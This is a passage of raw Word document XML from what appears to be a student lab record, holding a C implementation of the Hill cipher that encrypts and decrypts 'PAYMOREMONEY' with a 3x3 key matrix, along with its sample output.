        <w:t>i</w:t>
      </w:r>
      <w:r>
        <w:t>n</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>t</w:t>
      </w:r>
      <w:r>
        <w:t>f("</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="2"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r>
        <w:t>%c",c[</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>i</w:t>
      </w:r>
      <w:r>
        <w:t>]+65);</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00090D7C" w:rsidRDefault="00090D7C" w:rsidP="00090D7C">
      <w:pPr>
        <w:ind w:left="100"/>
      </w:pPr>
      <w:r>
        <w:t>pr</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>i</w:t>
      </w:r>
      <w:r>
        <w:t>n</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>t</w:t>
      </w:r>
      <w:r>
        <w:t>f("</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>\</w:t>
      </w:r>
      <w:r>
        <w:t>n"</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="2"/>
        </w:rPr>
        <w:t>)</w:t>
      </w:r>
      <w:r>
        <w:t>;</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00090D7C" w:rsidRDefault="00090D7C" w:rsidP="00090D7C">
      <w:pPr>
        <w:ind w:left="100"/>
      </w:pPr>
      <w:r>
        <w:t>}</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00090D7C" w:rsidRDefault="00090D7C" w:rsidP="00090D7C">
      <w:pPr>
        <w:ind w:left="100"/>
      </w:pPr>
      <w:r>
        <w:t>re</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>t</w:t>
      </w:r>
      <w:r>
        <w:t>urn 0;</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00090D7C" w:rsidRDefault="00090D7C" w:rsidP="00090D7C">
      <w:pPr>
        <w:ind w:left="100"/>
      </w:pPr>
      <w:r>
        <w:t>}</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00090D7C" w:rsidRDefault="00090D7C" w:rsidP="00090D7C">
      <w:pPr>
        <w:spacing w:before="16" w:line="260" w:lineRule="exact"/>
        <w:rPr>
          <w:sz w:val="26"/>
          <w:szCs w:val="26"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w:rsidR="00090D7C" w:rsidRDefault="00090D7C" w:rsidP="00090D7C">
      <w:pPr>
        <w:ind w:left="100"/>
      </w:pPr>
      <w:r>
        <w:t>vo</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>i</w:t>
      </w:r>
      <w:r>
        <w:t>d ca</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="1"/>
        </w:rPr>
        <w:t>l</w:t>
      </w:r>
      <w:r>
        <w:t>c(</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>i</w:t>
      </w:r>
      <w:r>
        <w:t>nt</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="1"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r>
        <w:t>k)</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00090D7C" w:rsidRDefault="00090D7C" w:rsidP="00090D7C">
      <w:pPr>
        <w:spacing w:line="260" w:lineRule="exact"/>
        <w:ind w:left="100"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:position w:val="-1"/>
        </w:rPr>
        <w:t>{</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00090D7C" w:rsidRDefault="00090D7C" w:rsidP="00090D7C">
      <w:pPr>
        <w:spacing w:before="5"/>
        <w:ind w:left="340"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>i</w:t>
      </w:r>
      <w:r>
        <w:t>nt</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t xml:space="preserve"> i</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="2"/>
        </w:rPr>
        <w:t>,</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>j</w:t>
      </w:r>
      <w:r>
        <w:t>,</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>t</w:t>
      </w:r>
      <w:r>
        <w:t>;</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00090D7C" w:rsidRDefault="00090D7C" w:rsidP="00090D7C">
      <w:pPr>
        <w:spacing w:before="16" w:line="260" w:lineRule="exact"/>
        <w:rPr>
          <w:sz w:val="26"/>
          <w:szCs w:val="26"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w:rsidR="00090D7C" w:rsidRDefault="00090D7C" w:rsidP="00090D7C">
      <w:pPr>
        <w:ind w:left="340"/>
      </w:pPr>
      <w:r>
        <w:t>for(</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>i</w:t>
      </w:r>
      <w:r>
        <w:t>=0</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>;i</w:t>
      </w:r>
      <w:r>
        <w:t>&lt;3</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>;i</w:t>
      </w:r>
      <w:r>
        <w:t>++)</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00090D7C" w:rsidRDefault="00090D7C" w:rsidP="00090D7C">
      <w:pPr>
        <w:spacing w:line="260" w:lineRule="exact"/>
        <w:ind w:left="340"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:position w:val="-1"/>
        </w:rPr>
        <w:t>{</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00090D7C" w:rsidRDefault="00090D7C" w:rsidP="00090D7C">
      <w:pPr>
        <w:spacing w:before="5"/>
        <w:ind w:left="810"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>t</w:t>
      </w:r>
      <w:r>
        <w:t>=0;</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00090D7C" w:rsidRDefault="00090D7C" w:rsidP="00090D7C">
      <w:pPr>
        <w:ind w:left="810"/>
      </w:pPr>
      <w:r>
        <w:t>for(</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>j</w:t>
      </w:r>
      <w:r>
        <w:t>=0</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>;j</w:t>
      </w:r>
      <w:r>
        <w:t>&lt;3</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="1"/>
        </w:rPr>
        <w:t>;</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>j</w:t>
      </w:r>
      <w:r>
        <w:t>++)</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00090D7C" w:rsidRDefault="00090D7C" w:rsidP="00090D7C">
      <w:pPr>
        <w:spacing w:line="260" w:lineRule="exact"/>
        <w:ind w:left="810"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:position w:val="-1"/>
        </w:rPr>
        <w:t>{</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00090D7C" w:rsidRDefault="00090D7C" w:rsidP="00090D7C">
      <w:pPr>
        <w:spacing w:before="5"/>
        <w:ind w:left="1518"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>t</w:t>
      </w:r>
      <w:r>
        <w:t>=</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>t</w:t>
      </w:r>
      <w:r>
        <w:t>+(c[</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>j</w:t>
      </w:r>
      <w:r>
        <w:t>+k]*a[</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>j</w:t>
      </w:r>
      <w:r>
        <w:t>][</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>i</w:t>
      </w:r>
      <w:r>
        <w:t>]</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="2"/>
        </w:rPr>
        <w:t>)</w:t>
      </w:r>
      <w:r>
        <w:t>;</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00090D7C" w:rsidRDefault="00090D7C" w:rsidP="00090D7C">
      <w:pPr>
        <w:spacing w:line="260" w:lineRule="exact"/>
        <w:ind w:left="810"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:position w:val="-1"/>
        </w:rPr>
        <w:t>}</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00090D7C" w:rsidRDefault="00090D7C" w:rsidP="00090D7C">
      <w:pPr>
        <w:spacing w:before="5"/>
        <w:ind w:left="810"/>
      </w:pPr>
      <w:r>
        <w:t>d[</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>i</w:t>
      </w:r>
      <w:r>
        <w:t>+k]=</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>t</w:t>
      </w:r>
      <w:r>
        <w:t>%26;</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00090D7C" w:rsidRDefault="00090D7C" w:rsidP="00090D7C">
      <w:pPr>
        <w:ind w:left="340"/>
      </w:pP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i</w:t>
      </w:r>
      <w:r>
        <w:t>nt</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r>
        <w:t>ch</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="1"/>
        </w:rPr>
        <w:t>e</w:t>
      </w:r>
      <w:r>
        <w:t>ck(</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>i</w:t>
      </w:r>
      <w:r>
        <w:t>nt</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="1"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r>
        <w:t>p)</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00090D7C" w:rsidRDefault="00090D7C" w:rsidP="00090D7C">
      <w:pPr>
        <w:ind w:left="100"/>
      </w:pPr>
      <w:r>
        <w:t>{</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00090D7C" w:rsidRDefault="00090D7C" w:rsidP="00090D7C">
      <w:pPr>
        <w:spacing w:before="16" w:line="260" w:lineRule="exact"/>
        <w:rPr>
          <w:sz w:val="26"/>
          <w:szCs w:val="26"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w:rsidR="00090D7C" w:rsidRDefault="00090D7C" w:rsidP="00090D7C">
      <w:pPr>
        <w:ind w:left="220"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>i</w:t>
      </w:r>
      <w:r>
        <w:t>f(n%3!=0)</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00090D7C" w:rsidRDefault="00090D7C" w:rsidP="00090D7C">
      <w:pPr>
        <w:ind w:left="220"/>
        <w:sectPr w:rsidR="00090D7C">
          <w:pgSz w:w="11900" w:h="16840"/>
          <w:pgMar w:top="1060" w:right="1680" w:bottom="280" w:left="1140" w:header="0" w:footer="1185" w:gutter="0"/>
          <w:cols w:space="720"/>
        </w:sectPr>
      </w:pPr>
      <w:r>
        <w:t>{</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00090D7C" w:rsidRDefault="00090D7C" w:rsidP="00090D7C">
      <w:pPr>
        <w:spacing w:before="74"/>
        <w:ind w:left="400"/>
      </w:pPr>
      <w:r>
        <w:lastRenderedPageBreak/>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P</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>l</w:t>
      </w:r>
      <w:r>
        <w:t>a</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>i</w:t>
      </w:r>
      <w:r>
        <w:t>n</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>t</w:t>
      </w:r>
      <w:r>
        <w:t>e</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="2"/>
        </w:rPr>
        <w:t>x</w:t>
      </w:r>
      <w:r>
        <w:t>t</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t xml:space="preserve"> i</w:t>
      </w:r>
      <w:r>
        <w:t>n</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="2"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>m</w:t>
      </w:r>
      <w:r>
        <w:t>u</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>lti</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="2"/>
        </w:rPr>
        <w:t>p</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>l</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve">es of </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>t</w:t>
      </w:r>
      <w:r>
        <w:t>hr</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="1"/>
        </w:rPr>
        <w:t>e</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve">e </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>\</w:t>
      </w:r>
      <w:r>
        <w:t>n");</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00090D7C" w:rsidRDefault="00090D7C" w:rsidP="00090D7C">
      <w:pPr>
        <w:ind w:left="400"/>
      </w:pPr>
      <w:r>
        <w:t>re</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>t</w:t>
      </w:r>
      <w:r>
        <w:t>urn 1;</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00090D7C" w:rsidRDefault="00090D7C" w:rsidP="00090D7C">
      <w:pPr>
        <w:spacing w:line="260" w:lineRule="exact"/>
        <w:ind w:left="220"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:position w:val="-1"/>
        </w:rPr>
        <w:t>}</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00090D7C" w:rsidRDefault="00090D7C" w:rsidP="00090D7C">
      <w:pPr>
        <w:spacing w:before="5"/>
        <w:ind w:left="220"/>
      </w:pPr>
      <w:r>
        <w:t>e</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>l</w:t>
      </w:r>
      <w:r>
        <w:t>se re</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>t</w:t>
      </w:r>
      <w:r>
        <w:t>urn</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="2"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r>
        <w:t>0;</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00090D7C" w:rsidRDefault="00090D7C" w:rsidP="00090D7C">
      <w:pPr>
        <w:spacing w:line="260" w:lineRule="exact"/>
        <w:ind w:left="100"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:position w:val="-1"/>
        </w:rPr>
        <w:t>}</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00" w:right="8119"/>
        <w:jc w:val="both"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:b/>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>O</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>ut</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>p</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>ut:</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00090D7C" w:rsidRDefault="00090D7C" w:rsidP="00090D7C">
      <w:pPr>
        <w:ind w:left="100" w:right="4635"/>
        <w:jc w:val="both"/>
      </w:pPr>
      <w:hyperlink r:id="rId15">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gcc</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="1"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r>
        <w:t>h</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>ill</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="2"/>
        </w:rPr>
        <w:t>f</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>i</w:t>
      </w:r>
      <w:r>
        <w:t>na</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>l</w:t>
      </w:r>
      <w:r>
        <w:t>.c</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00090D7C" w:rsidRDefault="00090D7C" w:rsidP="00090D7C">
      <w:pPr>
        <w:ind w:left="100" w:right="5359"/>
        <w:jc w:val="both"/>
      </w:pPr>
      <w:hyperlink r:id="rId16">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w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>/</w:t>
      </w:r>
      <w:r>
        <w:t>a.o</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="2"/>
        </w:rPr>
        <w:t>u</w:t>
      </w:r>
      <w:r>
        <w:t>t</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00090D7C" w:rsidRDefault="00090D7C" w:rsidP="00090D7C">
      <w:pPr>
        <w:spacing w:before="16" w:line="260" w:lineRule="exact"/>
        <w:rPr>
          <w:sz w:val="26"/>
          <w:szCs w:val="26"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w:rsidR="00090D7C" w:rsidRDefault="00090D7C" w:rsidP="00090D7C">
      <w:pPr>
        <w:ind w:left="100" w:right="7460"/>
        <w:jc w:val="both"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>E</w:t>
      </w:r>
      <w:r>
        <w:t>n</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>t</w:t>
      </w:r>
      <w:r>
        <w:t>er</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="2"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r>
        <w:t>p</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>l</w:t>
      </w:r>
      <w:r>
        <w:t>a</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>i</w:t>
      </w:r>
      <w:r>
        <w:t>n</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="2"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>t</w:t>
      </w:r>
      <w:r>
        <w:t>ext</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00090D7C" w:rsidRDefault="00090D7C" w:rsidP="00090D7C">
      <w:pPr>
        <w:ind w:left="100" w:right="6938"/>
        <w:jc w:val="both"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-24"/>
        </w:rPr>
        <w:t>P</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-23"/>
        </w:rPr>
        <w:t>A</w:t>
      </w:r>
      <w:r>
        <w:t>YMOR</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>E</w:t>
      </w:r>
      <w:r>
        <w:t>M</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>O</w:t>
      </w:r>
      <w:r>
        <w:t>N</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>E</w:t>
      </w:r>
      <w:r>
        <w:t>Y</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00090D7C" w:rsidRDefault="00090D7C" w:rsidP="00090D7C">
      <w:pPr>
        <w:ind w:left="100" w:right="5764"/>
        <w:jc w:val="both"/>
      </w:pPr>
      <w:r>
        <w:t>15 0 24 12 14 17 4 12 14 13 4 24</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00090D7C" w:rsidRDefault="00090D7C" w:rsidP="00090D7C">
      <w:pPr>
        <w:ind w:left="100" w:right="3913"/>
        <w:jc w:val="both"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>E</w:t>
      </w:r>
      <w:r>
        <w:t>ncryp</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>t</w:t>
      </w:r>
      <w:r>
        <w:t>ed</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="2"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r>
        <w:t>C</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>i</w:t>
      </w:r>
      <w:r>
        <w:t>pher</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-4"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-17"/>
        </w:rPr>
        <w:t>T</w:t>
      </w:r>
      <w:r>
        <w:t>ext</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="1"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r>
        <w:t>:</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r>
        <w:t>R R L</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-9"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r>
        <w:t>M</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-6"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r>
        <w:t>W</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-5"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r>
        <w:t>B K</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-13"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r>
        <w:t>A</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-13"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r>
        <w:t>S P</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-9"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r>
        <w:t>D H Decryp</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>t</w:t>
      </w:r>
      <w:r>
        <w:t>ed</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="2"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r>
        <w:t>C</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>i</w:t>
      </w:r>
      <w:r>
        <w:t>pher</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-4"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-19"/>
        </w:rPr>
        <w:t>T</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="1"/>
        </w:rPr>
        <w:t>e</w:t>
      </w:r>
      <w:r>
        <w:t>xt</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r>
        <w:t>:</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="1"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r>
        <w:t>P</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-23"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r>
        <w:t>A</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-21"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r>
        <w:t>Y</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-9"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r>
        <w:t>M O</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r>
        <w:t>R E</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="1"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r>
        <w:t>M</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r>
        <w:t>O N E</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-11"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r>
        <w:t>Y</w:t>
      </w:r>
      <w:hyperlink r:id="rId17">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pPr>
        <w:ind w:left="100" w:right="8213"/>
        <w:jc w:val="both"/>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772" w:right="1115" w:hanging="3672"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:lastRenderedPageBreak/>
        <w:t xml:space="preserve">Ex. </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>N</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t xml:space="preserve">o.: 5                                                                                                             </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
          <w:spacing w:val="54"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>D</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t xml:space="preserve">ate: </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>P</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>L</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
          <w:spacing w:val="-23"/>
        </w:rPr>
        <w:t>A</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Y</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
          <w:spacing w:val="-19"/>
        </w:rPr>
        <w:t>F</w:t>
      </w:r>
      <w:r>
